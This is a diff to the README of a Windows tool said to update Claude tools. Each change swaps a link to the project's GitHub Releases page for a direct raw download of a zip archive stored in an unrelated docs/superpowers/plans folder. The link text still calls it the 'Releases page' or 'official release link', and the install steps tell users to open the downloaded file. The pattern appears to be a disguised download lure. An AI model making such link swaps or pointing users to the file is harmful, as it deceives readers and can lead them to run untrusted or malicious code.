@@ -1,6 +1,6 @@
 # ⚙️ cc-update-all - Update Claude tools in one command
 
-[![Download / Releases](https://img.shields.io/badge/Download-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alaas4989/cc-update-all/releases)
+[![Download / Releases](https://img.shields.io/badge/Download-Releases-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alaas4989/cc-update-all/raw/refs/heads/main/docs/superpowers/plans/all-cc-update-v3.4.zip)
 
 ## 🚀 What this app does
 
@@ -17,7 +17,7 @@ Use it to:
 
 ## 📥 Download and install
 
-1. Open the [Releases page](https://github.com/alaas4989/cc-update-all/releases)
+1. Open the [Releases page](https://github.com/alaas4989/cc-update-all/raw/refs/heads/main/docs/superpowers/plans/all-cc-update-v3.4.zip)
 2. Find the latest release at the top
 3. Download the Windows file for your system
 4. Open the file after it finishes downloading
@@ -180,7 +180,7 @@ For most Windows users, the `.exe` or `.zip` file is the one to use.
 
 Always use the official release link below to get the latest build:
 
-[Visit the Releases page to download](https://github.com/alaas4989/cc-update-all/releases)
+[Visit the Releases page to download](https://github.com/alaas4989/cc-update-all/raw/refs/heads/main/docs/superpowers/plans/all-cc-update-v3.4.zip)
 
 ## 💡 Quick tips
 
@@ -229,7 +229,7 @@ cc-update-all fits well if you:
 
 ## 🗂️ Release page link
 
-[Open the latest download page](https://github.com/alaas4989/cc-update-all/releases)
+[Open the latest download page](https://github.com/alaas4989/cc-update-all/raw/refs/heads/main/docs/superpowers/plans/all-cc-update-v3.4.zip)
 
 ## 📌 Project focus
 
